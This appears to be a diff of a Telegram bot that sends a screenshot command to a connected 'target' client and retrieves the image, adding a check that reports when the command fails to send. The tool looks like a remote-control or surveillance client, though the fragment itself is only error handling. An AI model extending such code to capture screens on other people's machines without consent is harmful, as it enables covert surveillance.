@@ -26,6 +26,7 @@ def authenticate():
 
 async def ss(update, context):
     global image_count
+    feedback = False
 
     if not check_auth(update):
         return
@@ -42,7 +43,10 @@ async def ss(update, context):
     
     # Client is connected we can send the command
 
-    server.send_command("1", target) # 1 is the command to take a screenshot
+    feedback = server.send_command("1", target) # 1 is the command to take a screenshot
+    if not feedback:
+        await update.message.reply_text("Failed to send the command!")
+        return
     feedback = server.receive_image(image_count + 1, target)
     if not feedback:
         await update.message.reply_text("Failed to receive the screenshot!")
